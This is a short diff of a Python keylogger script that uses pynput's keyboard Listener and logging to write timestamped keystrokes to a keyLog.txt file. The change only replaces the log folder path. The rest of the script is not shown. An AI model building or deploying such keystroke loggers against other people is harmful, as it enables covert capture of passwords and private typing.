@@ -2,7 +2,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"C:\Users\jkart\OneDrive\Desktop\AI assistant"
+log_dir = r"C:\Users\OneDrive\Desktop\Folder_key"
 logging.basicConfig(filename=(log_dir + r"/keyLog.txt"),
                     level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
